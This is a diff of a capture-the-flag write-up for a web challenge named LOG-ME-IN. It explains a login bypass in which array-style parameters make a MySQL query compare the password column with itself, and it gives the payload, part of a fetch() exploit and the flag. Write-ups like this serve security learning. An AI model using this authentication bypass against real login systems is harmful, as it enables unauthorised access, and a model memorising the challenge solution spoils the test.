@@ -1,8 +1,11 @@
-Flag: `CTF{a-premium-effort-deserves-a-premium-flag}`
+# LOG-ME-IN
 
+This challenge exploits the fact that we can send an array which when parsed makes the MySQL server execute a query similar to the following:
+```
+SELECT * FROM users WHERE username='michelle' AND password=`password`='1'
+``` 
 
-Payload: `username=michelle&password[password]=something&csrf=`
-
+Hence payload for the request is simply: `username=michelle&password[password]=1&csrf=`
 
 Exploit:
 ```
@@ -23,3 +26,7 @@ await fetch("https://log-me-in.web.ctfcompetition.com/login", {
     "mode": "cors"
 });
 ```
+
+After logging in, it is easy to just go and grab the flag.
+
+Flag: `CTF{a-premium-effort-deserves-a-premium-flag}`
